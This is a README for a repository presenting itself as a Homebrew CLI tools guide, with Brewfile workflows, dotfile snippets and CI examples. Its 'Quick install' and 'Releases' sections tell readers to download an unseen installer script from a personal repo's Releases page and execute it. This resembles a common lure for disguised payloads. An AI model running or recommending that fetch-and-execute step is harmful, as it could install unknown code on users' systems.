# Homebrew CLI Guide — Tools, Workflows, Examples, Tips and Configs

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/Yilbertsito/homebrew-cli-guide/releases)

![terminal](https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png)
![macos](https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg)
![linux](https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg)

Table of contents
- About
- Who this is for
- How this repo is organized
- Quick install (Releases)
- Core workflows
  - Install tools
  - Keep a reproducible setup
  - Scripting and automation
- Example toolset and commands
  - Networking and HTTP
  - Dev and build
  - Productivity
  - Shell helpers
- Configs and dotfiles
  - zsh example
  - bash example
  - tmux and git
- Quarto and docs
- Testing and CI
- Contributing
- Releases
- License

About
This repository compiles CLI tools you can install with Homebrew on macOS and Linux. It shows practical examples, workflows, and tuned configs. The content aims to reduce friction when you set up a terminal-based toolchain. The main body focuses on commands and clear patterns you can copy.

Who this is for
- Developers who use macOS or Linux.
- DevOps engineers who script installs and updates.
- People who want a compact, reproducible CLI setup.
- Spanish readers: the guide stays in Spanish where relevant.

How this repo is organized
- docs/: full guides, tutorials, YAML examples.
- examples/: ready-to-run scripts and sample dotfiles.
- workflows/: automated scripts and CI snippets.
- releases/: packaged installers and archive files.

Quick install (Releases)
This repo ships a release package you can download and run. Visit the Releases page and download the installer file. After download, execute the file to bootstrap the example toolset.

Download and run an installer:
```bash
# visit the releases page in a browser or use curl to fetch the asset
# Replace <asset-file> with the file you downloaded from:
# https://github.com/Yilbertsito/homebrew-cli-guide/releases

curl -LO https://github.com/Yilbertsito/homebrew-cli-guide/releases/download/v1.0/homebrew-cli-guide-installer.sh
chmod +x homebrew-cli-guide-installer.sh
./homebrew-cli-guide-installer.sh
```

If the link does not work for you, check the "Releases" section on the repo page:
https://github.com/Yilbertsito/homebrew-cli-guide/releases

Core workflows
Install tools
- Use Homebrew taps and bundles to keep a list of packages.
- Keep an environment file for each OS or host type.
- Use Conda or asdf for language runtimes when you need version isolation.

Example Brewfile driven setup
```bash
# Create Brewfile with desired taps, casks and apps
brew bundle dump --file=./Brewfile --describe

# Install from Brewfile
brew bundle --file=./Brewfile
```

Keep a reproducible setup
- Store your Brewfile in dotfiles or repo.
- Include a script that updates and re-installs.
- Use brew bundle check to validate current state.

Reproducible bootstrap script
```bash
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
brew update
brew bundle --file=./Brewfile
brew upgrade
brew cleanup
```

Scripting and automation
- Use shell wrappers for common flows.
- Prefer small scripts that fail fast.
- Version scripts within the repo and tag releases.

Example CI snippet (GitHub Actions)
```yaml
name: Test bootstrap
on: [push, pull_request]
jobs:
  bootstrap:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install Homebrew
        run: |
          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
      - name: Run Brewfile install
        run: brew bundle --file=./Brewfile
```

Example toolset and commands
Use this section as a quick cheat sheet. Replace placeholders with your values.

Networking and HTTP
- httpie: simple HTTP client
- curl: scriptable transfers
- wget: robust downloads

Examples
```bash
# JSON API call
http GET https://api.example.com/users/1

# Save a file via curl
curl -fL -o /tmp/file.tar.gz https://example.com/file.tar.gz
```

Dev and build
- git, gh, ghq
- build tools: make, cmake, ninja
- language helpers: node, python, go, rust (via asdf or brew)

Examples
```bash
# Clone with gh
gh repo clone owner/repo

# Create a virtualenv and install
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Productivity
- tmux for session management
- fzf for fuzzy search
- ripgrep for fast search
- bat for syntax highlighted cat

Examples
```bash
# Search in repo
rg "TODO" --hidden --no-ignore -n

# Fuzzy find and edit
fzf --preview 'bat --style=numbers --color=always {}' | xargs -r $EDITOR
```

Shell helpers
- zsh or bash with plugins
- starship prompt
- direnv for per-project envs

Configs and dotfiles
Store these files in examples/dotfiles. Link them into $HOME or use a manager like stow.

zsh example
~/.zshrc snippet:
```bash
export ZSH="$HOME/.oh-my-zsh"
export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"

# prompt
eval "$(starship init zsh)"

# fzf
[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
```

bash example
~/.bashrc snippet:
```bash
export PATH="$HOME/.local/bin:$PATH"
source /usr/local/etc/profile.d/bash_completion.sh
alias ll='ls -lah'
```

tmux and git
~/.tmux.conf
```tmux
set -g mouse on
setw -g automatic-rename off
set -g history-limit 10000
```

~/.gitconfig
```ini
[user]
  name = Your Name
  email = you@example.com
[core]
  editor = code --wait
[alias]
  st = status
  br = branch
  co = checkout
```

Quarto and docs
Quarto fits well for documentation that mixes prose and code. Use it to generate manuals and examples.

Install via Homebrew
```bash
brew install quarto
```

Example workflow
- Write a .qmd file with code chunks.
- Render to HTML or PDF with quarto render.
- Use GitHub Pages or Netlify to publish.

Quarto sample command
```bash
quarto create-project my-docs
quarto render docs/index.qmd --to html
```

Testing and CI
- Linters: shellcheck, shfmt.
- Test commands in a container or clean shell.
- For macOS-specific steps, run tests inside a macOS runner or VM.

Shellcheck example
```bash
brew install shellcheck
shellcheck examples/scripts/*.sh
```

Contributing
- Fork the repo.
- Create a feature branch for changes.
- Add tests or examples for new tools.
- Open a pull request with a clear description.

Pull request checklist
- Add or update Brewfile entries when adding tools.
- Add docs under docs/ for any new workflow.
- Keep commits small and focused.
- Use rebasing for a clean history.

Templates and best practices
- Use a template for issue reports and PRs.
- Provide minimal repro steps for bugs.
- Include the OS and Homebrew version for environment issues.

Releases
The Releases page hosts installer packages and compressed example sets. Download the asset and run it on a supported host. Example asset name: homebrew-cli-guide-installer.sh. Run it as shown earlier.

Visit releases and download the file:
https://github.com/Yilbertsito/homebrew-cli-guide/releases

If you want a checklist for a release:
- Bump version in metadata.
- Update CHANGELOG.md.
- Build archive of docs and examples.
- Tag and create a GitHub Release with assets.

Common troubleshooting tips
- If brew command fails, run brew doctor and follow its suggestions.
- If a tool's path conflicts, check $PATH order in your shell config.
- For permission problems, avoid sudo with Homebrew; follow the official install layout.

Searchable topics
This repo covers:
automation, bash, cli-tools, development, devops, documentation, homebrew, linux, macos, productivity, quarto, spanish, terminal, zsh

Contact and maintainers
This repo accepts community contributions. Use GitHub issues and PRs for changes. Add a brief description of your change and test steps.

License
This repository uses the MIT License. See LICENSE for full terms.